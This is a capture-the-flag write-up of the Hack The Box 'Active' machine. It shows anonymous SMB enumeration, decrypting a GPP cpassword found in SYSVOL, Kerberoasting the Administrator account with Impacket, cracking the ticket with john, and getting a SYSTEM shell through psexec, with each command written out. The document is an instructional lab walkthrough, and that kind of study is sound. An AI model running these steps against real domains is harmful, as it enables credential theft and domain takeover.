#Windows #ActiveDirectory #SMB #GPP #Kerberoast #PSExec #john

## Overview

Active is an easy Hack The Box machine that plays out like a textbook small-AD compromise, and it's a great box for understanding why "low privilege domain user" is so often the only foothold an attacker needs. The path has two halves. First, an anonymous SMB session leads to a `Groups.xml` file left in the domain's `SYSVOL` share, which contains a Group Policy Preferences (GPP) password that Microsoft made trivially decryptable. Those credentials then let me **Kerberoast** the Administrator account, crack its service ticket offline, and walk in with `psexec` as `SYSTEM`.

No exploits, no shells dropped on disk for the foothold, every step abuses a legitimate Windows feature that was configured insecurely. That's what makes it realistic.

## Recon

These notes pick up at SMB, which is where Active gets interesting. The host advertises the share layout of a Domain Controller (`NETLOGON`, `SYSVOL`, `Replication`), so everything from here is AD enumeration. I started by adding the domain to my hosts file so name-based tooling resolves:

```
active.htb -> /etc/hosts
```

### Anonymous SMB Enumeration

The first question against any SMB host is "what can I see without credentials?" A **null session** (`-N`, no username or password) often still returns the share list:

```sh
smbclient -N -L \\10.129.184.136
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
```

The Guest account was disabled, so this is a true anonymous read. Checking access with SMBMap showed I had **read-only** access to the `Replication` share as the null user.

> **Why this matters:** `Replication` is a copy of `SYSVOL`, the share every domain-joined machine reads at boot to pull Group Policy. It's world-readable by design. Anything sensitive an admin accidentally stores there is exposed to every account on the domain, including anonymous in misconfigured environments.

## Foothold

### Looting SYSVOL for a GPP Password

Rather than click through the share by hand, I let NetExec's `spider_plus` module crawl it and dump metadata for every file:

```sh
nxc smb 10.129.184.136 -u '' -p '' -M spider_plus
```

This drops a JSON inventory in `/tmp/nxc_spider_plus`. Scanning it, one filename jumps out, `Groups.xml`, sitting under a Group Policy folder:

```json
"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"
```

Pulling that file back reveals a stored credential:

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User name="active.htb\SVC_TGS" ...><Properties action="U" ... cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" userName="active.htb\SVC_TGS"/></User></Groups>
```

That gives me a username (`SVC_TGS`) and a `cpassword` blob.

> **What is GPP cpassword?** Group Policy Preferences let admins push settings, including local account passwords, to machines via `SYSVOL`. The password is AES-encrypted and stored in `cpassword`. The problem: in 2012 Microsoft *published the static AES key* in MSDN documentation. So the encryption protects nothing. **MS14-025** removed the ability to create new GPP passwords, but it never cleaned up existing ones, which is why retired boxes (and real domains) still leak them.

Because the key is public, decryption is instant:

```sh
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
‹redacted›
```

I now had valid domain credentials:

```
SVC_TGS : ‹redacted›
```

## Privilege Escalation

### Kerberoasting the Administrator

With any authenticated domain user I can ask the KDC for service tickets. I used Impacket's `GetUserSPNs` to find accounts with a Service Principal Name and request their tickets:

```sh
impacket-GetUserSPNs -request -dc-ip 10.129.184.136 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```

> **Why Kerberoasting works:** Any account that has an SPN (typically service accounts) can have a TGS ticket requested for it by *any* authenticated user. That ticket is encrypted with the service account's NTLM hash. So the KDC hands me a blob I can grind offline, no lockouts, no noise on the target. If the account's password is weak, it cracks. On Active, the **Administrator** account had an SPN, which is the jackpot.

The captured ticket fell quickly to `rockyou`:

```sh
john GetUserSPNs.out --wordlist=/usr/share/wordlists/rockyou.txt
‹redacted›
```

That yielded domain admin credentials:

```
administrator : ‹redacted›
```

## Root

### PSExec as SYSTEM

With admin creds, Impacket's `psexec` gives an interactive `SYSTEM` shell. It works by uploading a service binary to the `ADMIN$` share, registering it as a Windows service, and starting it, all over SMB, no RDP needed:

```sh
impacket-psexec active.htb/administrator@10.129.184.136
[*] Found writable share ADMIN$
[*] Uploading file HIWMrssu.exe
[*] Creating service ugho on 10.129.184.136.....
[*] Starting service ugho.....

C:\Windows\system32> whoami
nt authority\system
```

Box rooted:

```powershell
C:\Users\Administrator\Desktop> type root.txt
‹redacted›
```

## Takeaways

- **Null SMB sessions are still worth checking first.** A single anonymous read of `Replication`/`SYSVOL` carried the whole foothold.
- **GPP passwords are a permanent liability.** MS14-025 stopped new ones but left existing `cpassword` values readable and decryptable with a public key. Hunt for `Groups.xml` in `SYSVOL` on every engagement.
- **Kerberoasting needs only one domain account.** Any authenticated user can roast every SPN-bearing account; weak service-account passwords turn that into domain admin.
